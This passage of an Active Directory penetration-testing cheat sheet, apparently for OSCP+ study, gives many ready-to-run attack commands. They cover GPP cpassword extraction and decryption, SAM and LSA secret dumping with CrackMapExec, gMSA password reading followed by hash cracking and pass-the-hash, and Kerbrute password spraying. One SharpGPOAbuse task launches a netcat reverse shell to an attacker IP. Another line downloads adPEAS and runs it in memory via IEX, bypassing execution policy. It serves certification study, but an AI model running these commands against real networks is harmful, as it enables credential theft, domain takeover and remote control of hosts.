\hostname.domain\Policies\{00000000-0000-0000-0000-00000000000}\MACHINE\Preferences\Groups\Groups.xml
```


Commande `dir` pour la rubrique « GPP Main Method for Extraction ».

```powershell
dir /s Groups.xml

type Groups.xml
```


**Paramètres et repères :**
`Hash` · `cpassword`  


Commande `gpp-decrypt` pour la rubrique « GPP Main Method for Extraction ».

```bash
gpp-decrypt [gpp_hash/cpassword]

# Example
gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
sup3r53cr3tGP0pa55
```


Commande `dir` pour la rubrique « GPP Main Method for Extraction ».

```bash
# Check for cpassword in the SYSvol share to obtain cleartext passwords in XML files.
dir \\\\<domain>\\SYSVOL\\<domain>\\Policies\\ /s /b | findstr cpassword

# Look for Groups.xml files which might contain cleartext passwords.
smbclient //dc-ip/SYSVOL -U "domain\username"
```


### Impacket-Get-GPPPassword

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`Impacket-Get-GPPPassword` · `Get-GPPPassword.py`  


Commande `get-gpppassword.py` pour la rubrique « Impacket-Get-GPPPassword ».

```bash
Get-GPPPassword.py -no-pass '[DOMAIN_CONTROLLER]'
```


Commande `get-gpppassword.py` pour la rubrique « Impacket-Get-GPPPassword ».

```bash
Get-GPPPassword.py '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'
```


Commande `get-gpppassword.py` pour la rubrique « Impacket-Get-GPPPassword ».

```bash
Get-GPPPassword.py -hashes :'[NThash]' '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'
```


Commande `get-gpppassword.py` pour la rubrique « Impacket-Get-GPPPassword ».

```bash
Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
```


### SMB Share-SYSVOL

Examiner les objets, les droits et les services du domaine.


Commande `https` pour la rubrique « SMB Share-SYSVOL ».

```bash
# Reference to a script for downloading files in SYSVOL
https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
```


**Paramètres et repères :**
`cpassword`  


Rechercher ou filtrer des données.

```bash
grep -inr "cpassword"
```


### CrackMapExec


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password
```


### Importing the Module

Vérifier les ports et les services de la cible autorisée.


Commande `powershell` pour la rubrique « Importing the Module ».

```powershell
powershell -ExecutionPolicy Bypass

# Use any of the following options
Import-Module .\adPEAS.ps1

. .\adPEAS.ps1

gc -raw .\adPEAS.ps1 | iex

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')
```


### De base Usage


**Paramètres et repères :**
`Invoke-adPEAS`  


Commande `invoke-adpeas` pour la rubrique « De base Usage ».

```powershell
Invoke-adPEAS -Domain '[domain].com' -Outputfile 'C:\temp\adPEAS_outputfile' -NoColor
```


Commande `invoke-adpeas` pour la rubrique « De base Usage ».

```powershell
Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com'
```


Exemple technique pour la rubrique « De base Usage ».

```powershell
$SecPassword = ConvertTo-SecureString '[password]' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('[domain]\[userName]', $SecPassword)
Invoke-adPEAS -Domain '[domain].com' -Cred $Cred
```


Commande `invoke-adpeas` pour la rubrique « De base Usage ».

```powershell
Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com' -Username '[domain]\[userName]' -Password '[password]' -Force
```


### Module-Specific Usage


Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».

```powershell
Invoke-adPEAS -Module Domain
```


Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».

```powershell
Invoke-adPEAS -Module Rights
```


Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».

```powershell
Invoke-adPEAS -Module GPO
```


Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».

```powershell
Invoke-adPEAS -Module ADCS
```


Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».

```powershell
Invoke-adPEAS -Module Creds
```


Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».

```powershell
Invoke-adPEAS -Module Delegation
```


Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».

```powershell
Invoke-adPEAS -Module Accounts
```


Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».

```powershell
Invoke-adPEAS -Module Computer
```


Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».

```powershell
Invoke-adPEAS -Module Bloodhound
```


Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».

```powershell
Invoke-adPEAS -Module Bloodhound -Scope All
```


#### Manual Découverte of gMSAs


**Paramètres et repères :**
`Get-ADServiceAccount` · `msDS-ManagedPassword`  


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"} -Properties *
```


**Paramètres et repères :**
`Get-ADServiceAccount`  


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-ADObject -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)" -Properties *
```


**Paramètres et repères :**
`msDS-ManagedPassword`  


#### Automated Découverte with BloodHound

Examiner les objets, les droits et les services du domaine.


**Paramètres et repères :**
`SharpHound`  


Commande `sharphound.exe` pour la rubrique « Automated Découverte with BloodHound ».

```powershell
SharpHound.exe -c All
```


**Paramètres et repères :**
`ReadProperty` · `msDS-ManagedPassword`  


Rechercher ou filtrer des données.

```text
Find Principals with Unusual Rights on Password Attributes
```


### GMSA Password Retrieval with GMSAPasswordReader

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`GMSAPasswordReader.exe` · `msDS-ManagedPassword`  


#### Usage


**Paramètres et repères :**
`GMSAPasswordReader.exe`  


Commande `.` pour la rubrique « Usage ».

```powershell
.\GMSAPasswordReader.exe --AccountName [GMSA_ACCOUNT_NAME]

# Example
.\GMSAPasswordReader.exe --accountname 'svc_apache'
# This will return probably an rc4_hmac (not the Old Value), which is the same as an NTLM hash, so we can try to crack it (hashcat -m 1000 '[ntlm_hash]' [wordlist]) or do a pass the hash, don't forget the '$' for the username if it is a service account (evil-winrm -i [ip] -u svc_apache$ -H [ntlm_hash]).
```


#### Notes complémentaires


**Paramètres et repères :**
`msDS-ManagedPassword`  


### Alternative Commandes


**Paramètres et repères :**
`GMSAPasswordReader.exe` · `msDS-ManagedPassword`  


Examiner les informations AD ou réseau en PowerShell.

```powershell
# Find all gMSA accounts
Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"} -Properties msDS-ManagedPassword
```


**Paramètres et repères :**
`Get-ADObject` · `Get-ADServiceAccount` · `msDS-ManagedPassword`  


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-ADObject -Filter 'ObjectClass -eq "msDS-GroupManagedServiceAccount"' -Properties msDS-ManagedPassword
```


**Paramètres et repères :**
`Get-ADAttributeEditor` · `msDS-ManagedPassword`  


Interroger les objets de l'annuaire LDAP.

```bash
ldapsearch -x -H ldap://<domain_controller> -D "<user>@<domain>" -w "<password>" -b "DC=domain,DC=com" "(objectClass=msDS-GroupManagedServiceAccount)" msDS-ManagedPassword
```


**Paramètres et repères :**
`Get-DomainGMSA` · `msDS-ManagedPassword`  


Commande `get-domaingmsa` pour la rubrique « Alternative Commandes ».

```powershell
# List gMSA accounts with PowerView
Get-DomainGMSA -Properties msDS-ManagedPassword
```


## Group Policy Object (GPO) Abuse

Examiner les objets, les droits et les services du domaine.


Commande `powershell` pour la rubrique « Group Policy Object (GPO) Abuse ».

```powershell
powershell -ExecutionPolicy bypass
Import-Module ./PowerView.ps1
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-NetGPO | select displayname
```


Commande `get-domainobjectacl` pour la rubrique « Group Policy Object (GPO) Abuse ».

```powershell
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```


**Paramètres et repères :**
`WriteGPO` · `OwnsGPO`  


Commande `gpo` pour la rubrique « Group Policy Object (GPO) Abuse ».

```text
GPO control
```


Commande `get-gpo` pour la rubrique « Group Policy Object (GPO) Abuse ».

```powershell
Get-GPO -Name "[DisplayName]"
```


Commande `get-gpo` pour la rubrique « Group Policy Object (GPO) Abuse ».

```powershell
Get-GPO -Guid [gpo_id]
```


Commande `get-gppermission` pour la rubrique « Group Policy Object (GPO) Abuse ».

```powershell
Get-GPPermission -Guid [gpo_id] -TargetType User -TargetName [user]
```


**Paramètres et repères :**
`SharpGPOAbuse`  


Commande `./sharpgpoabuse.exe` pour la rubrique « Group Policy Object (GPO) Abuse ».

```powershell
./SharpGPOAbuse.exe --AddComputerTask --TaskName "test" --Author "[current_user]" --Command "cmd.exe" --Arguments "/c c:\path\to\nc.exe [attacker_ip] [port] -e cmd.exe" --GPOName "[GPO_to_abuse]"
```


Commande `.` pour la rubrique « Group Policy Object (GPO) Abuse ».

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "[GPO_to_abuse]"
```


Commande `gpupdate` pour la rubrique « Group Policy Object (GPO) Abuse ».

```powershell
gpupdate /force
```


## Enumerating Domain Controller

Examiner les objets, les droits et les services du domaine.


### Using Enum4linux

Examiner les permissions et la configuration de Linux.


Énumérer les informations SMB ou RPC.

```bash
enum4linux -U <DOMAIN_IP>
```


Énumérer les informations SMB ou RPC.

```bash
enum4linux -a <DOMAIN_IP>
```


Énumérer les informations SMB ou RPC.

```bash
enum4linux -u <VALID_USERNAME> -p <VALID_PASSWORD> <DOMAIN_IP>
```


Énumérer les informations SMB ou RPC.

```bash
enum4linux -a <DOMAIN_IP> > domain_enum.txt
```


### Using CrackMapExec


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --shares
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --gpp-password
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --sam
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> -d [domain].com --lsa
```


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec ldap <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> -d [domain].com --users
```


### Using Ldapsearch

Examiner les objets, les droits et les services du domaine.


Interroger les objets de l'annuaire LDAP.

```bash
ldapsearch -x -h <DOMAIN_IP> -s base
```


Interroger les objets de l'annuaire LDAP.

```bash
ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```


Interroger les objets de l'annuaire LDAP.

```bash
ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local" "(objectClass=computer)" name
```


Interroger les objets de l'annuaire LDAP.

```bash
ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local"
```


### Using Rpcclient


Énumérer les informations SMB ou RPC.

```bash
rpcclient -U <VALID_USERNAME>%<VALID_PASSWORD> <DOMAIN_IP>
```


Énumérer les informations SMB ou RPC.

```bash
rpcclient $> enumdomusers
```


Énumérer les informations SMB ou RPC.

```bash
rpcclient $> enumdomgroups
```


Énumérer les informations SMB ou RPC.

```bash
rpcclient $> netshareenum
```


Énumérer les informations SMB ou RPC.

```bash
rpcclient $> querydominfo
```


### Using Smbclient

Examiner les objets, les droits et les services du domaine.


Énumérer les informations SMB ou RPC.

```bash
smbclient -L //<DOMAIN_IP> -U <VALID_USERNAME>%<VALID_PASSWORD>
```


Énumérer les informations SMB ou RPC.

```bash
smbclient //<DOMAIN_IP>/NETLOGON -U <VALID_USERNAME>%<VALID_PASSWORD>
```


Énumérer les informations SMB ou RPC.

```bash
smbclient //<DOMAIN_IP>/SYSVOL -U <VALID_USERNAME>%<VALID_PASSWORD> -c "get important_file.txt"
```


### Using BloodHound (SharpHound)

Examiner les objets, les droits et les services du domaine.


**Paramètres et repères :**
`SharpHound`  


Commande `sharphound.exe` pour la rubrique « Using BloodHound (SharpHound) ».

```bash
SharpHound.exe -c All -d [domain].com -u <VALID_USERNAME> -p <VALID_PASSWORD> -dc <DOMAIN_IP>
```


### Using Nmap

Vérifier les ports et les services de la cible autorisée.


Identifier les versions des services.

```bash
nmap -p 88,135,139,389,445,636,3268,3389 -sC -sV -Pn <DOMAIN_IP>
```


Examiner le service avec les scripts NSE sélectionnés.

```bash
nmap --script smb-enum-shares,smb-enum-users -p445 <DOMAIN_IP>
```


Examiner le service avec les scripts NSE sélectionnés.

```bash
nmap --script ldap-search -p389 <DOMAIN_IP>
```


### Using Kerbrute


Commande `kerbrute` pour la rubrique « Using Kerbrute ».

```bash
# A good wordlist of usernames is /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt
kerbrute userenum --dc <DOMAIN_IP> -d [domain].com userlist.txt
```


Commande `kerbrute` pour la rubrique « Using Kerbrute ».

```bash
kerbrute passwordspray --dc <DOMAIN_IP> -d [domain].com userlist.txt <PASSWORD>
```


### Using PowerShell (if allowed)

Observer les permissions et la configuration de Windows.


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-ADUser -Filter * -Property * | Select-Object Name, SamAccountName, EmailAddress
```


Examiner les informations AD ou réseau en PowerShell.

```powershell
Get-ADGroup -Filter * | Select-Object Name, GroupScope
```


### Tips for CrackMapExec Énumération


Examiner le service avec les scripts NSE sélectionnés.

```bash
nmap -p 445 --script smb-os-discovery <IP_RANGE>
```


**Paramètres et repères :**
`--local-auth` (authentification locale)  


Examiner le service distant avec les paramètres fournis.

```bash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares --users
```


**Paramètres et repères :**
`smbclient`  


Énumérer les informations SMB ou RPC.

```bash
smbclient //<DOMAIN_IP>/<SHARE> -U <USERNAME>
```


### Énumération des utilisateurs


Examiner le service distant avec les paramètres fournis.

```bash
# Enumerate valid users and their privileges
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --users

# Check for users with admin privileges
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --admin

# Enumerate users with valid credentials (password)
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --users -d <DOMAIN_NAME>

# Enumerate users with valid NTLM hash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --users -d <DOMAIN_NAME>
```


### Shares Énumération


Examiner le service distant avec les paramètres fournis.

```bash
# Enumerate accessible shares with provided credentials
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares

# List accessible shares using a password
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares -d <DOMAIN_NAME>

# List accessible shares using an NTLM hash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --shares -d <DOMAIN_NAME>
```


### Group Énumération


Examiner le service distant avec les paramètres fournis.

```bash
# List groups in the domain
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --groups -d <DOMAIN_NAME>

# With NTLM hash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --groups -d <DOMAIN_NAME>
```


### Politique de mots de passe Énumération


Examiner le service distant avec les paramètres fournis.

```bash
# Check domain password policies
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --pass-pol -d <DOMAIN_NAME>
```


### Local Accounts Énumération


Examiner le service distant avec les paramètres fournis.

```bash
# List users and shares on a local machine
crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> --users --shares --local-auth
```


### LDAP Énumération

Examiner les objets, les droits et les services du domaine.


Examiner le service distant avec les paramètres fournis.

```bash
# Dump domain users
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --users

# Dump domain groups
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --groups
```


### MSSQL Énumération

Examiner les connexions, la configuration et les requêtes de la base de données.


Examiner le service distant avec les paramètres fournis.

```bash
# List databases
crackmapexec mssql <TARGET_IP> -u <USERNAME> -p <PASSWORD> --dbs

# Execute SQL queries
crackmapexec mssql <TARGET_IP> -u <USERNAME> -p <PASSWORD> -q "SELECT name FROM master.dbo.sysdatabases"
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
